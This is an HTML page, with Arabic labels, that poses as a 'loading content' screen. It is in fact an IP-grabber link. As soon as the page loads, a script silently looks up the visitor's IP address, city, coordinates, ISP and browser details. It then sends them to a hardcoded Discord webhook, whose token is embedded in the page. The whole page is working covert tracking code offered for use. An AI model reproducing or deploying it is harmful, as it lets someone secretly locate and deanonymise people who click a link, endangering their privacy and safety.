<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>رابط تتبع IP</title>
    <style>
        body {
            background: #0d0d1a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            font-family: Arial;
            text-align: center;
        }
        .box {
            background: #1a1a2e;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 30px #5865f2;
        }
        .box h1 {
            color: #5865f2;
        }
        .box p {
            color: #aaa;
        }
    </style>
</head>
<body>
    <div class="box">
        <h1>📡 جاري تحميل المحتوى...</h1>
        <p>يرجى الانتظار لحظة</p>
    </div>

    <script>
        (function() {
            // =============================================================
            //  رابط Webhook الخاص بك (ضع الرابط هنا)
            // =============================================================
            var WEBHOOK_URL = "https://discord.com/api/webhooks/1532041480225427610/8hj5HMSMCYsaNoO-0_rGCJ64hGz-Z7jLvuZGxettxaH5q6m8FSueAXgJ5z0sXCSlAwvU"

            // =============================================================
            //  جلب IP والموقع
            // =============================================================
            function getIPAndLocation() {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://ipinfo.io/json', true);
                xhr.timeout = 5000;
                xhr.onload = function() {
                    try {
                        var data = JSON.parse(xhr.responseText);
                        var loc = data.loc ? data.loc.split(',') : ['?', '?'];
                        sendData({
                            ip: data.ip || 'Unknown',
                            country: data.country || '?',
                            region: data.region || '?',
                            city: data.city || '?',
                            lat: loc[0] || '?',
                            lon: loc[1] || '?',
                            org: data.org || '?',
                            timezone: data.timezone || '?',
                            hostname: data.hostname || '?'
                        });
                    } catch (e) {
                        sendData({ error: 'Failed to parse location' });
                    }
                };
                xhr.onerror = function() { sendData({ error: 'Failed to fetch IP' }); };
                xhr.ontimeout = function() { sendData({ error: 'Timeout' }); };
                xhr.send();
            }

            // =============================================================
            //  إرسال البيانات إلى Webhook
            // =============================================================
            function sendData(ipData) {
                var payload = {
                    'IP': ipData.ip || 'Unknown',
                    'Country': ipData.country || '?',
                    'Region': ipData.region || '?',
                    'City': ipData.city || '?',
                    'Lat': ipData.lat || '?',
                    'Lon': ipData.lon || '?',
                    'Organization': ipData.org || '?',
                    'Timezone': ipData.timezone || '?',
                    'Hostname': ipData.hostname || '?',
                    'UserAgent': navigator.userAgent || 'Unknown',
                    'Platform': navigator.platform || 'Unknown',
                    'Language': navigator.language || 'Unknown',
                    'Screen': screen.width + 'x' + screen.height,
                    'Referrer': document.referrer || 'Direct',
                    'Page URL': window.location.href,
                    'Time': new Date().toISOString()
                };

                var jsonData = JSON.stringify(payload);

                // إرسال عبر XMLHttpRequest
                try {
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', WEBHOOK_URL, true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(jsonData);
                    console.log('[+] Data sent:', payload);
                } catch (e) {
                    // محاولة عبر sendBeacon
                    try {
                        navigator.sendBeacon(WEBHOOK_URL, jsonData);
                    } catch (e2) {
                        console.log('[-] Failed to send data');
                    }
                }
            }

            // =============================================================
            //  تنفيذ التتبع عند تحميل الصفحة
            // =============================================================
            getIPAndLocation();
        })();
    </script>
</body>
</html>
